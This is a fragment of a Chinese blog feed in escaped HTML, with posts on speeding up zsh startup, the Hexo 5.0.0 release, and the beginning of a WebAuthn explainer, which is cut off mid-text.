class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\">\n<div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-08-10</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">Hexo 5.0.0 正式发布</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-07-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 